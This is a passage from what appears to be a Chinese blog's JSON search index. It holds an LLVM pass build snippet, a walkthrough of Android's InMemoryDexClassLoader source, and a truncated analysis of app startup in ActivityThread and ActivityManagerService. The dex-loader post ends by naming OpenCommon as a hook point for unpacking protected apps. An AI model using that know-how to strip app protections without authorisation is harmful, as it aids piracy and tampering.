&quot;; errs().write_escaped(F.getName()) &lt;&lt; &#x27;\\n&#x27;; return false; &#125;&#125;;&#125;char NewPass::ID = 0;static RegisterPass&lt;NewPass&gt; X(&quot;NewPass&quot;, &quot;Welcome To My New Pass&quot;); 然后先重新加载cmake 然后在目录下 ninja LLVMNewPass 然后进入我们之前编译好的hello.c文件目录下 1opt -load /home/cruve/tools/llvm/llvm-14.0.0/llvm/cmake-build-release/lib/LLVMNewPass.so -NewPass -enable-new-pm=0 hello.ll -o hello.bc 完毕！","categories":[],"tags":[],"keywords":[]},{"title":"安卓类加载器补充InMemoryDexClassLoader","slug":"安卓类加载器补充InMemoryDexClassLoader","date":"2024-11-25T08:08:02.000Z","updated":"2024-11-25T10:38:10.829Z","comments":true,"path":"2024/11/25/安卓类加载器补充InMemoryDexClassLoader/","link":"","permalink":"http://example.com/2024/11/25/%E5%AE%89%E5%8D%93%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E8%A1%A5%E5%85%85InMemoryDexClassLoader/","excerpt":"","text":"InMemoryDexClassLoader加载内存dex的流程Android 8新增了InMemoryDexClassLoader，专门用于加载内存dex，依旧以15的r3为例 InMemoryDexClassLoaderInMemoryDexClassLoader 是一个继承自 BaseDexClassLoader 的类，用于在运行时从内存中加载 Dex 文件，而无需将其存储到磁盘。它主要用于动态加载字节缓冲区中的类。 123456789101112131415161718//libcore/dalvik/src/main/java/dalvik/system/InMemoryDexClassLoader.javapublic final class InMemoryDexClassLoader extends BaseDexClassLoader &#123;//调用父类 BaseDexClassLoader 的构造方法，用传入的 Dex 缓冲区、库路径和父加载器进行初始化。该方法支持多个 Dex 文件的加载。 public InMemoryDexClassLoader(@NonNull ByteBuffer @NonNull [] dexBuffers, @Nullable String librarySearchPath, @Nullable ClassLoader parent) &#123; super(dexBuffers, librarySearchPath, parent); &#125;//重载了第一个构造方法，但将 librarySearchPath 设置为 null。适用于无需加载本地库的场景。 public InMemoryDexClassLoader(@NonNull ByteBuffer @NonNull [] dexBuffers,@Nullable ClassLoader parent) &#123; this(dexBuffers, null, parent); &#125; //重载了第二个构造方法，适用于加载单个 Dex 文件。自动将单个 ByteBuffer 封装成数组，调用第二个构造方法。 public InMemoryDexClassLoader(@NonNull ByteBuffer dexBuffer, @Nullable ClassLoader parent) &#123; this(new ByteBuffer[] &#123; dexBuffer &#125;, parent); &#125;&#125; 我们来看看父类的BaseDexClassLoader构造方法 12345678910111213141516//libcore/dalvik/src/main/java/dalvik/system/InMemoryDexClassLoader.javapublic class BaseDexClassLoader extends ClassLoader &#123;... public BaseDexClassLoader(ByteBuffer[] dexFiles, String librarySearchPath, ClassLoader parent) &#123; super(parent); this.sharedLibraryLoaders = null; this.sharedLibraryLoadersAfter = null; this.pathList = new DexPathList(this, librarySearchPath); //调用 DexPathList 的方法，初始化内存中的 Dex 文件路径。 this.pathList.initByteBufferDexPath(dexFiles); // Run background verification after having set &#x27;pathList&#x27;. this.pathList.maybeRunBackgroundVerification(this);//后台验证 Dex 文件。 &#125;&#125; DexPathList()12345678910111213//libcore/dalvik/src/main/java/dalvik/system/DexPathList.java public DexPathList(ClassLoader definingContext, String librarySearchPath) &#123; //校验参数 if (definingContext == null) &#123; throw new NullPointerException(&quot;definingContext == null&quot;); &#125; this.definingContext = definingContext; // 加载本地库 this.nativeLibraryDirectories = splitPaths(librarySearchPath, false); this.systemNativeLibraryDirectories =splitPaths(System.getProperty(&quot;java.library.path&quot;), true); this.nativeLibraryPathElements = makePathElements(getAllNativeLibraryDirectories()); &#125; initByteBufferDexPath1234567891011121314151617181920212223//libcore/dalvik/src/main/java/dalvik/system/DexPathList.javavoid initByteBufferDexPath(ByteBuffer[] dexFiles) &#123;... //创建 DexFile 并初始化 dexElements final List&lt;IOException&gt; suppressedExceptions = new ArrayList&lt;IOException&gt;(); try &#123; Element[] null_elements = null; //调用 DexFile 构造函数，将 ByteBuffer[] 转换为实际的 DexFile DexFile dex = new DexFile(dexFiles, definingContext, null_elements); //将 DexFile 封装为 Element 并存储到 dexElements。 dexElements = new Element[] &#123; new Element(dex) &#125;; &#125; catch (IOException suppressed) &#123; System.logE(&quot;Unable to load dex files&quot;, suppressed); suppressedExceptions.add(suppressed); dexElements = new Element[0]; &#125; if (suppressedExceptions.size() &gt; 0) &#123; dexElementsSuppressedExceptions = suppressedExceptions.toArray( new IOException[suppressedExceptions.size()]); &#125;&#125; DexFile调用openInMemoryDexFile()方法，返回的cookie是用于操作dex文件的唯一凭证，可以理解为”身份码”。 1234567//路径：libcore/dalvik/src/main/java/dalvik/system/DexFile.java DexFile(ByteBuffer[] bufs, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123; mCookie = openInMemoryDexFiles(bufs, loader, elements); mInternalCookie = mCookie; mFileName = null; &#125; openInMemoryDexFile()最后调用openInMemoryDexFilesNative 12345678910111213141516//路径：libcore/dalvik/src/main/java/dalvik/system/DexFile.javaprivate static Object openInMemoryDexFiles(ByteBuffer[] bufs, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123; // Preprocess the ByteBuffers for openInMemoryDexFilesNative. We extract // the backing array (non-direct buffers only) and start/end positions // so that the native method does not have to call Java methods anymore. byte[][] arrays = new byte[bufs.length][]; int[] starts = new int[bufs.length]; int[] ends = new int[bufs.length]; for (int i = 0; i &lt; bufs.length; ++i) &#123; arrays[i] = bufs[i].isDirect() ? null : bufs[i].array(); starts[i] = bufs[i].position(); ends[i] = bufs[i].limit(); &#125; return openInMemoryDexFilesNative(bufs, arrays, starts, ends, loader, elements);&#125; openInMemoryDexFilesNative12345678910111213141516171819202122232425//art/runtime/native/dalvik_system_DexFile.ccstatic jobject DexFile_openInMemoryDexFilesNative(JNIEnv* env, jclass, jobjectArray buffers, jobjectArray arrays, jintArray jstarts, jintArray jends, jobject class_loader, jobjectArray dex_elements) &#123;... // 分配内存并复制数据... // 加载 .dex 文件 std::vector&lt;std::string&gt; error_msgs; const OatFile* oat_file = nullptr; std::vector&lt;std::unique_ptr&lt;const DexFile&gt;&gt; dex_files = Runtime::Current()-&gt;GetOatFileManager().OpenDexFilesFromOat(std::move(dex_mem_maps), class_loader, dex_elements, /*out*/ &amp;oat_file, /*out*/ &amp;error_msgs); //将 dex_files 和 oat_file 的加载结果打包成一个 JNI 可返回的对象（通常是句柄或引用）。 return CreateCookieFromOatFileManagerResult(env, dex_files, oat_file, error_msgs);&#125; CreateCookieFromOatFileManagerResult用于根据加载 .dex 文件的结果，创建一个供 Java 层使用的句柄（通常是一个 jlongArray，表示加载的 .dex 文件的句柄）。其主要职责是处理加载结果中的异常情况，或者将成功加载的 DexFile 信息转换为一个数组返回给 Java。 1234567891011121314//art/runtime/native/dalvik_system_DexFile.ccstatic jobject CreateCookieFromOatFileManagerResult( JNIEnv* env, std::vector&lt;std::unique_ptr&lt;const DexFile&gt;&gt;&amp; dex_files, const OatFile* oat_file, const std::vector&lt;std::string&gt;&amp; error_msgs) &#123; ClassLinker* linker = Runtime::Current()-&gt;GetClassLinker(); if (dex_files.empty()) &#123; ... &#125; jlongArray array = ConvertDexFilesToJavaArray(env, oat_file, dex_files); ... return array;&#125; OpenDexFilesFromOat它的主要作用是解析 OAT 文件并提取出嵌入的 DEX 文件，为后续的类加载过程服务 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182//路径：art/runtime/oat/oat_file_manager.ccstd::vector&lt;std::unique_ptr&lt;const DexFile&gt;&gt; OatFileManager::OpenDexFilesFromOat( const char* dex_location, jobject class_loader, jobjectArray dex_elements, const OatFile** out_oat_file, std::vector&lt;std::string&gt;* error_msgs) &#123; ScopedTrace trace(StringPrintf(&quot;%s(%s)&quot;, __FUNCTION__, dex_location)); CHECK(dex_location != nullptr); CHECK(error_msgs != nullptr); std::vector&lt;std::unique_ptr&lt;const DexFile&gt;&gt; dex_files;//定义一个存储 DexFile 的动态数组 std::unique_ptr&lt;ClassLoaderContext&gt; context( ClassLoaderContext::CreateContextForClassLoader(class_loader, dex_elements));//定义一个指向 ClassLoaderContext 对象的 unique_ptr //创建了一个 OatFileAssistant 对象 if (class_loader == nullptr) &#123; LOG(WARNING) &lt;&lt; &quot;Opening an oat file without a class loader. &quot; &lt;&lt; &quot;Are you using the deprecated DexFile APIs?&quot;; &#125; else if (context != nullptr) &#123; auto oat_file_assistant = std::make_unique&lt;OatFileAssistant&gt;(dex_location, kRuntimeISA, context.get(), runtime-&gt;GetOatFilesExecutable(), only_use_system_oat_files_);... // 使用 OatFileAssistant 来选择最佳的 .oat 文件 std::unique_ptr&lt;const OatFile&gt; oat_file(oat_file_assistant-&gt;GetBestOatFile().release()); VLOG(oat) &lt;&lt; &quot;OatFileAssistant(&quot; &lt;&lt; dex_location &lt;&lt; &quot;).GetBestOatFile()=&quot; &lt;&lt; (oat_file != nullptr ? oat_file-&gt;GetLocation() : &quot;&quot;) &lt;&lt; &quot; (executable=&quot; &lt;&lt; (oat_file != nullptr ? oat_file-&gt;IsExecutable() : false) &lt;&lt; &quot;)&quot;;... if (!added_image_space) &#123; DCHECK(dex_files.empty());...//OAT文件的优化 // 从指定的 .oat 文件中加载 DEX 文件 if (oat_file != nullptr) &#123; dex_files = oat_file_assistant-&gt;LoadDexFiles(*oat_file.get(), dex_location); ... &#125; &#125; if (dex_files.empty()) &#123; ScopedTrace failed_to_open_dex_files(&quot;FailedToOpenDexFilesFromOat&quot;); error_msgs-&gt;push_back(&quot;Failed to open dex files from &quot; + odex_location); &#125; else if (should_madvise) &#123; //...dex文件优化 &#125; &#125; if (oat_file != nullptr) &#123; VLOG(class_linker) &lt;&lt; &quot;Registering &quot; &lt;&lt; oat_file-&gt;GetLocation(); *out_oat_file = RegisterOatFile(std::move(oat_file)); &#125; &#125; else &#123; // oat_file == nullptr // 校验类路径中是否已经有正在加载的 dex 文件。 // 如果是，则报告错误并提供当前堆栈跟踪。 // 很可能开发人员并不打算这样做，因为这会浪费 // 性能和内存。 // 性能和内存。 ... &#125; &#125; //如果 Dex 文件加载失败，代码会尝试通过 ArtDexFileLoader 类重新加载，并提供详细的错误信息。 if (dex_files.empty()) &#123; std::string error_msg; static constexpr bool kVerifyChecksum = true; ArtDexFileLoader dex_file_loader(dex_location); if (!dex_file_loader.Open(Runtime::Current()-&gt;IsVerificationEnabled(), kVerifyChecksum, /*out*/ &amp;error_msg, &amp;dex_files)) &#123; ScopedTrace fail_to_open_dex_from_apk(&quot;FailedToOpenDexFilesFromApk&quot;); LOG(WARNING) &lt;&lt; error_msg; error_msgs-&gt;push_back(&quot;Failed to open dex files from &quot; + std::string(dex_location) + &quot; because: &quot; + error_msg); &#125; &#125;... return dex_files;&#125; LoadDexFiles()12345678910111213141516171819202122232425262728293031323334353637383940//art/runtime/oat/oat_file_assistant.ccbool OatFileAssistant::LoadDexFiles(const OatFile&amp; oat_file, const std::string&amp; dex_location, std::vector&lt;std::unique_ptr&lt;const DexFile&gt;&gt;* out_dex_files) &#123; // Load the main dex file. std::string error_msg; //通过oat_file.GetOatDexFile()获得oat、dex文件 const OatDexFile* oat_dex_file = oat_file.GetOatDexFile(dex_location.c_str(), &amp;error_msg); if (oat_dex_file == nullptr) &#123; LOG(WARNING) &lt;&lt; error_msg; return false; &#125; //通过oat_dex_file-&gt;OpenDexFile()打开dex文件 std::unique_ptr&lt;const DexFile&gt; dex_file = oat_dex_file-&gt;OpenDexFile(&amp;error_msg); if (dex_file.get() == nullptr) &#123; LOG(WARNING) &lt;&lt; &quot;Failed to open dex file from oat dex file: &quot; &lt;&lt; error_msg; return false; &#125; //添加dex文件到dex_files数组中 out_dex_files-&gt;push_back(std::move(dex_file)); // 看是否存在多个dex文件 for (size_t i = 1;; i++) &#123; std::string multidex_dex_location = DexFileLoader::GetMultiDexLocation(i, dex_location.c_str()); oat_dex_file = oat_file.GetOatDexFile(multidex_dex_location.c_str()); if (oat_dex_file == nullptr) &#123; // There are no more multidex entries to load. break; &#125; //打开第i个dex文件 dex_file = oat_dex_file-&gt;OpenDexFile(&amp;error_msg); if (dex_file.get() == nullptr) &#123; LOG(WARNING) &lt;&lt; &quot;Failed to open dex file from oat dex file: &quot; &lt;&lt; error_msg; return false; &#125; //添加dex文件到dex_files数组中 out_dex_files-&gt;push_back(std::move(dex_file)); &#125; return true;&#125; GetOatDexFile（）12345678910111213141516171819202122232425262728293031323334353637383940414243444546//art/runtime/oat/oat_file.ccconst OatDexFile* OatFile::GetOatDexFile(const char* dex_location, std::string* error_msg) const &#123; const OatDexFile* oat_dex_file = nullptr; std::string_view key(dex_location); //通过key在oat_dex_files_map中找到dex文件所在位置 auto primary_it = oat_dex_files_.find(key); if (primary_it != oat_dex_files_.end()) &#123; oat_dex_file = primary_it-&gt;second; DCHECK(oat_dex_file != nullptr); &#125; else &#123; // This dex_location is not one of the dex locations directly mentioned in the // oat file. The correct lookup is via the canonical location but first see in // the secondary_oat_dex_files_ whether we&#x27;ve looked up this location before. MutexLock mu(Thread::Current(), secondary_lookup_lock_); auto secondary_lb = secondary_oat_dex_files_.lower_bound(key); if (secondary_lb != secondary_oat_dex_files_.end() &amp;&amp; key == secondary_lb-&gt;first) &#123; oat_dex_file = secondary_lb-&gt;second; // May be null. &#125; else &#123; // We haven&#x27;t seen this dex_location before, we must check the canonical location. std::string dex_canonical_location = DexFileLoader::GetDexCanonicalLocation(dex_location); if (dex_canonical_location != dex_location) &#123; std::string_view canonical_key(dex_canonical_location); auto canonical_it = oat_dex_files_.find(canonical_key); if (canonical_it != oat_dex_files_.end()) &#123; oat_dex_file = canonical_it-&gt;second; &#125; // else keep null. &#125; // else keep null. // Copy the key to the string_cache_ and store the result in secondary map. string_cache_.emplace_back(key.data(), key.length()); std::string_view key_copy(string_cache_.back()); secondary_oat_dex_files_.PutBefore(secondary_lb, key_copy, oat_dex_file); &#125; &#125; if (oat_dex_file == nullptr) &#123; if (error_msg != nullptr) &#123; std::string dex_canonical_location = DexFileLoader::GetDexCanonicalLocation(dex_location); *error_msg = &quot;Failed to find OatDexFile for DexFile &quot; + std::string(dex_location) + &quot; (canonical path &quot; + dex_canonical_location + &quot;) in OatFile &quot; + GetLocation(); &#125; return nullptr; &#125; return oat_dex_file;&#125; OatDexFile::OpenDexFile12345678910111213//art/runtime/oat/oat_file.ccstd::unique_ptr&lt;const DexFile&gt; OatDexFile::OpenDexFile(std::string* error_msg) const &#123; ScopedTrace trace(__PRETTY_FUNCTION__); static constexpr bool kVerify = false; static constexpr bool kVerifyChecksum = false; ArtDexFileLoader dex_file_loader(dex_file_container_, dex_file_location_); return dex_file_loader.OpenOne(dex_file_pointer_ - dex_file_container_-&gt;Begin(), dex_file_location_checksum_, this, kVerify, kVerifyChecksum, error_msg);&#125; dex_file_loader.OpenOne12345678910111213141516171819202122232425262728293031//art/libdexfile/dex/dex_file_loader.ccstd::unique_ptr&lt;const DexFile&gt; DexFileLoader::OpenOne(size_t header_offset, uint32_t location_checksum, const OatDexFile* oat_dex_file, bool verify, bool verify_checksum, std::string* error_msg) &#123; //记录操作范围 DEXFILE_SCOPED_TRACE(std::string(&quot;Open dex file &quot;) + location_); uint32_t magic; if (!InitAndReadMagic(header_offset, &amp;magic, error_msg) || !MapRootContainer(error_msg)) &#123; DCHECK(!error_msg-&gt;empty()); return &#123;&#125;; &#125; //验证根容器 DCHECK(root_container_ != nullptr); DCHECK_LE(header_offset, root_container_-&gt;Size()); //加载DEX文件内容 std::unique_ptr&lt;const DexFile&gt; dex_file = OpenCommon(root_container_, root_container_-&gt;Begin() + header_offset, root_container_-&gt;Size() - header_offset, location_, location_checksum, oat_dex_file, verify, verify_checksum, error_msg, nullptr); return dex_file;&#125; DexFileLoader::OpenCommon123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//art/libdexfile/dex/dex_file_loader.ccstd::unique_ptr&lt;DexFile&gt; DexFileLoader::OpenCommon(std::shared_ptr&lt;DexFileContainer&gt; container,//指向包含DEX文件数据的容器对象 const uint8_t* base,//指向文件数据的起始地址。 size_t app_compat_size,//与应用兼容的文件大小。 const std::string&amp; location,//表示DEX文件的位置路径。 std::optional&lt;uint32_t&gt; location_checksum,//文件的校验和（可选值）。 const OatDexFile* oat_dex_file,//关联的OatDexFile对象。 bool verify,//是否启用DEX文件验证。 bool verify_checksum,//是否校验文件的校验和。 std::string* error_msg,//指向用于存储错误消息的字符串指针。 DexFileLoaderErrorCode* error_code//指向用于存储错误代码的指针。 ) &#123; //容器的初始化 if (container == nullptr) &#123; // We should never pass null here, but use reasonable default for app compat anyway. container = std::make_shared&lt;MemoryDexFileContainer&gt;(base, app_compat_size); &#125; CHECK_GE(base, container-&gt;Begin()); CHECK_LE(base, container-&gt;End()); const size_t size = container-&gt;End() - base; if (error_code != nullptr) &#123; *error_code = DexFileLoaderErrorCode::kDexFileError; &#125; //创建DEX文件实例 std::unique_ptr&lt;DexFile&gt; dex_file; auto header = reinterpret_cast&lt;const DexFile::Header*&gt;(base); if (size &gt;= sizeof(StandardDexFile::Header) &amp;&amp; StandardDexFile::IsMagicValid(base)) &#123; uint32_t checksum = location_checksum.value_or(header-&gt;checksum_); dex_file.reset(new StandardDexFile(base, location, checksum, oat_dex_file, container)); &#125; else if (size &gt;= sizeof(CompactDexFile::Header) &amp;&amp; CompactDexFile::IsMagicValid(base)) &#123; uint32_t checksum = location_checksum.value_or(header-&gt;checksum_); dex_file.reset(new CompactDexFile(base, location, checksum, oat_dex_file, container)); &#125; else &#123; *error_msg = StringPrintf(&quot;Invalid or truncated dex file &#x27;%s&#x27;&quot;, location.c_str()); &#125; if (dex_file == nullptr) &#123; *error_msg = StringPrintf(&quot;Failed to open dex file &#x27;%s&#x27;: %s&quot;, location.c_str(), error_msg-&gt;c_str()); return nullptr; &#125; //文件初始化 if (!dex_file-&gt;Init(error_msg)) &#123; dex_file.reset(); return nullptr; &#125; //可选校验 if (verify &amp;&amp; !dex_file-&gt;IsCompactDexFile()) &#123; DEXFILE_SCOPED_TRACE(std::string(&quot;Verify dex file &quot;) + location); if (!dex::Verify(dex_file.get(), location.c_str(), verify_checksum, error_msg)) &#123; if (error_code != nullptr) &#123; *error_code = DexFileLoaderErrorCode::kVerifyError; &#125; return nullptr; &#125; &#125; if (error_code != nullptr) &#123; *error_code = DexFileLoaderErrorCode::kNoError; &#125; return dex_file;&#125; 从这里可以看出，不管是DexClassLoader、PathClassLoader，还是InMemoryDexClassLoader，尽管它们的流程可能会不太一样，但最终都会调用OpenCommon()方法创建dexfile，而且该方法的参数含有dex的起始地址（base）和大小（size），因此这里可以作为一个非常好的脱壳点。","categories":[],"tags":[],"keywords":[]},{"title":"安卓应用启动流程浅析","slug":"应用启动流程浅析","date":"2024-11-24T00:49:30.000Z","updated":"2024-11-25T03:11:40.774Z","comments":true,"path":"2024/11/24/应用启动流程浅析/","link":"","permalink":"http://example.com/2024/11/24/%E5%BA%94%E7%94%A8%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E6%B5%85%E6%9E%90/","excerpt":"","text":"在安卓系统启动流程浅析中，最后由ActivityThread初始化应用的 Application 类。依旧以15的r3版本为例 ActivityThread.main()123456789101112131415161718//frameworks/base/core/java/android/app/ActivityThread.javapublic static void main(String[] args) &#123; Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, &quot;ActivityThreadMain&quot;); ... Looper.prepareMainLooper();//为主线程创建一个 主 Looper（消息循环器），并将其设置为主线程的默认 Looper。 ... ActivityThread thread = new ActivityThread();//创建线程并将当前线程附加到ActivityThread，参数false表示不使用新线程 thread.attach(false, startSeq);//调用了thread.attach()方法 if (sMainThreadHandler == null) &#123;//Handler 初始化 sMainThreadHandler = thread.getHandler(); &#125; ... // End of event ActivityThreadMain. Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);//跟踪 Looper.loop();//启动当前线程的消息循环 ...&#125; ActivityThread.attach()12345678910111213141516171819202122232425262728//frameworks/base/core/java/android/app/ActivityThread.java private void attach(boolean system, long startSeq) &#123; //system 参数用于指示当前调用是否属于系统进程，startSeq 是一个与当前进程启动相关的唯一标识符（序列号） sCurrentActivityThread = this; mConfigurationController = new ConfigurationController(this); mSystemThread = system; mStartSeq = startSeq; mDdmSyncStageUpdater.next(Stage.Attach); if (!system) &#123;//非系统进程进入此分支 android.ddm.DdmHandleAppName.setAppName(&quot;&lt;pre-initialized&gt;&quot;,UserHandle.myUserId()); RuntimeInit.setApplicationObject(mAppThread.asBinder());//初始化RuntimeInit.mApplicationObject值 final IActivityManager mgr = ActivityManager.getService();//获取 ActivityManager 服务（AMS）的远程接口 try &#123; mgr.attachApplication(mAppThread, startSeq);//**重点** &#125; catch (RemoteException ex) &#123; throw ex.rethrowFromSystemServer(); &#125; ... &#125; else &#123;// 系统进程进入此分支 ... //创建应用进程的主 Context 实例 ContextImpl context = ContextImpl.createAppContext(this, getSystemContext().mPackageInfo); //创建应用程序实例（Application 对象），并初始化它。 mInitialApplication = context.mPackageInfo.makeApplicationInner(true, null); mInitialApplication.onCreate(); ... &#125; ActivityManagerService.attachApplication()1234567891011121314//frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.javapublic final void attachApplication(IApplicationThread thread, long startSeq) &#123; if (thread == null) &#123; throw new SecurityException(&quot;Invalid application interface&quot;); &#125; synchronized (this) &#123; int callingPid = Binder.getCallingPid();//获取当前调用者的进程 ID（PID）。 final int callingUid = Binder.getCallingUid();//获取当前调用者的用户 ID（UID） //清除当前线程的调用身份（即进程 ID 和用户 ID）,返回唯一标识符以便后续恢复调用者身份 final long origId = Binder.clearCallingIdentity(); attachApplicationLocked(thread, callingPid, callingUid, startSeq);//执行核心的绑定逻辑,重点分析 Binder.restoreCallingIdentity(origId);//恢复之前保存的调用身份（即进程 ID 和用户 ID）。 &#125; &#125; attachApplicationLocked()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.javaprivate void attachApplicationLocked(@NonNull IApplicationThread thread,int pid, int callingUid, long startSeq) &#123; ProcessRecord app; long startTime = SystemClock.uptimeMillis(); long bindApplicationTimeMillis; long bindApplicationTimeNanos; if (pid != MY_PID &amp;&amp; pid &gt;= 0) &#123; synchronized (mPidsSelfLocked) &#123; app = mPidsSelfLocked.get(pid);//根据pid获取application record &#125;... if (app.getIsolatedEntryPoint() != null) &#123;// 检查是否有隔离入口点 thread.runIsolatedEntryPoint(app.getIsolatedEntryPoint(), app.getIsolatedEntryPointArgs()); &#125; else &#123;//绑定流程 boolean isSdkInSandbox = false;//是否运行在沙盒 SDK 中。 ComponentName instrumentationName = null;//指定 Instrumentation 类名。 Bundle instrumentationArgs = null;// 测试时的传参。 IInstrumentationWatcher instrumentationWatcher = null; IUiAutomationConnection instrumentationUiConnection = null; if (instr2 != null) &#123; isSdkInSandbox = instr2.mIsSdkInSandbox; instrumentationName = instr2.mClass; instrumentationArgs = instr2.mArguments; instrumentationWatcher = instr2.mWatcher; instrumentationUiConnection = instr2.mUiAutomationConnection; &#125; thread.bindApplication( processName, appInfo,//、应用信息 app.sdkSandboxClientAppVolumeUuid, app.sdkSandboxClientAppPackage, isSdkInSandbox, providerList, instrumentationName, profilerInfo, instrumentationArgs, instrumentationWatcher, instrumentationUiConnection, testMode, mBinderTransactionTrackingEnabled, enableTrackAllocation, isRestrictedBackupMode || !normalMode, app.isPersistent(), new Configuration(app.getWindowProcessController().getConfiguration()), app.getCompat(), getCommonServicesLocked(app.isolated), mCoreSettingsObserver.getCoreSettingsLocked(), buildSerial, autofillOptions, contentCaptureOptions, app.getDisabledCompatChanges(), app.getLoggableCompatChanges(), serializedSystemFontMap, app.getStartElapsedTime(), app.getStartUptime()); &#125;... &#125;&#125; ActivityThread.bindApplication()123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990//frameworks/base/core/java/android/app/ActivityThread.java@Overridepublic final void bindApplication( String processName, ApplicationInfo appInfo, String sdkSandboxClientAppVolumeUuid, String sdkSandboxClientAppPackage, boolean isSdkInSandbox, ProviderInfoList providerList, ComponentName instrumentationName, ProfilerInfo profilerInfo, Bundle instrumentationArgs, IInstrumentationWatcher instrumentationWatcher, IUiAutomationConnection instrumentationUiConnection, int debugMode, boolean enableBinderTracking, boolean trackAllocation, boolean isRestrictedBackupMode, boolean persistent, Configuration config, CompatibilityInfo compatInfo, Map services, Bundle coreSettings, String buildSerial, AutofillOptions autofillOptions, ContentCaptureOptions contentCaptureOptions, long[] disabledCompatChanges, long[] loggableCompatChanges, SharedMemory serializedSystemFontMap, long startRequestedElapsedTime, long startRequestedUptime) &#123; if (services != null) &#123; if (false) &#123; // Test code to make sure the app could see the passed-in services. for (Object oname : services.keySet()) &#123; if (services.get(oname) == null) &#123; continue; // AM just passed in a null service. &#125; String name = (String) oname; // See b/79378449 about the following exemption. switch (name) &#123; case &quot;package&quot;: case Context.WINDOW_SERVICE: continue; &#125; if (ServiceManager.getService(name) == null) &#123; Log.wtf(TAG, &quot;Service &quot; + name + &quot; should be accessible by this app&quot;); &#125; &#125; &#125; // Setup the service cache in the ServiceManager ServiceManager.initServiceCache(services); &#125; setCoreSettings(coreSettings); AppBindData data = new AppBindData(); data.processName = processName; data.appInfo = appInfo; data.sdkSandboxClientAppVolumeUuid = sdkSandboxClientAppVolumeUuid; data.sdkSandboxClientAppPackage = sdkSandboxClientAppPackage; data.isSdkInSandbox = isSdkInSandbox; data.providers = providerList.getList(); data.instrumentationName = instrumentationName; data.instrumentationArgs = instrumentationArgs; data.instrumentationWatcher = instrumentationWatcher; data.instrumentationUiAutomationConnection = instrumentationUiConnection; data.debugMode = debugMode; data.enableBinderTracking = enableBinderTracking; data.trackAllocation = trackAllocation; data.restrictedBackupMode = isRestrictedBackupMode; data.persistent = persistent; data.config = config; data.compatInfo = compatInfo; data.initProfilerInfo = profilerInfo; data.buildSerial = buildSerial; data.autofillOptions = autofillOptions; data.contentCaptureOptions = contentCaptureOptions; data.disabledCompatChanges = disabledCompatChanges; data.mLoggableCompatChanges = loggableCompatChanges; data.mSerializedSystemFontMap = serializedSystemFontMap; data.startRequestedElapsedTime = startRequestedElapsedTime; data.startRequestedUptime = startRequestedUptime; updateCompatOverrideScale(compatInfo); CompatibilityInfo.applyOverrideScaleIfNeeded(config); sendMessage(H.BIND_APPLICATION, data);//将BIND_APPLICATION消息添加到消息队列中&#125; 这里的 class H extends Handler，是ActivityThread的一个内置类，H类中有处理消息的逻辑handleMessage() handleMessage()123456789101112131415//frameworks/base/core/java/android/app/ActivityThread.javapublic void handleMessage(Message msg) &#123; if (DEBUG_MESSAGES) Slog.v(TAG, &quot;&gt;&gt;&gt; handling: &quot; + codeToString(msg.what)); switch (msg.what) &#123; case BIND_APPLICATION: Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, &quot;bindApplication&quot;); AppBindData data = (AppBindData)msg.obj; handleBindApplication(data);//重点 Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER); break; ... &#125; ...&#125; handleBindApplication(data)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//frameworks/base/core/java/android/app/ActivityThread.java@UnsupportedAppUsageprivate void handleBindApplication(AppBindData data) &#123; ... mBoundApplication = data;//将应用的绑定信息（AppBindData 对象）赋值给 mBoundApplication mConfigurationController.setConfiguration(data.config); mConfigurationController.setCompatConfiguration(data.config); mConfiguration = mConfigurationController.getConfiguration(); mCompatibilityInfo = data.compatInfo; ... final boolean isSdkSandbox = data.sdkSandboxClientAppPackage != null; //获取LoadedApk对象 data.info = getPackageInfo(data.appInfo, mCompatibilityInfo, null /* baseLoader */, false /* securityViolation */, true /* includeCode */, false /* registerPackage */, isSdkSandbox);//重点 ... //创建appContext final IActivityManager mgr = ActivityManager.getService(); final ContextImpl appContext = ContextImpl.createAppContext(this, data.info); mConfigurationController.updateLocaleListFromAppContext(appContext); ... long timestampApplicationOnCreateNs = 0; try &#123; //此处data.info指LoadedApk, 通过反射创建目标应用Application对象 app = data.info.makeApplicationInner(data.restrictedBackupMode, null);//重点 app.setAutofillOptions(data.autofillOptions); app.setContentCaptureOptions(data.contentCaptureOptions); sendMessage(H.SET_CONTENT_CAPTURE_OPTIONS_CALLBACK, data.appInfo.packageName); mInitialApplication = app; final boolean updateHttpProxy;... try &#123; mInstrumentation.onCreate(data.instrumentationArgs); &#125; catch (Exception e) &#123; throw new RuntimeException( &quot;Exception thrown in onCreate() of &quot; + data.instrumentationName + &quot;: &quot; + e.toString(), e); &#125; try &#123; timestampApplicationOnCreateNs = SystemClock.uptimeNanos(); mInstrumentation.callApplicationOnCreate(app); &#125; catch (Exception e) &#123; ... &#125; &#125; finally &#123; if (data.appInfo.targetSdkVersion &lt; Build.VERSION_CODES.O_MR1 || StrictMode.getThreadPolicy().equals(writesAllowedPolicy)) &#123; StrictMode.setThreadPolicy(savedPolicy); &#125; &#125; // Preload fonts resources...&#125; getPackageInfo创建LoadedApk对象，并将将新创建的LoadedApk加入到mPackages。 123456789101112131415161718192021222324252627282930313233343536373839404142434445 private LoadedApk getPackageInfo(ApplicationInfo aInfo, CompatibilityInfo compatInfo, ClassLoader baseLoader, boolean securityViolation, boolean includeCode, boolean registerPackage, boolean isSdkSandbox) &#123; final boolean differentUser = (UserHandle.myUserId() != UserHandle.getUserId(aInfo.uid)); synchronized (mResourcesManager) &#123; WeakReference&lt;LoadedApk&gt; ref; // 根据不同的情况获取缓存的LoadedApk对象 if (differentUser || isSdkSandbox) &#123; // Caching not supported across users and for sdk sandboxes ref = null; &#125; else if (includeCode) &#123; ref = mPackages.get(aInfo.packageName); &#125; else &#123; ref = 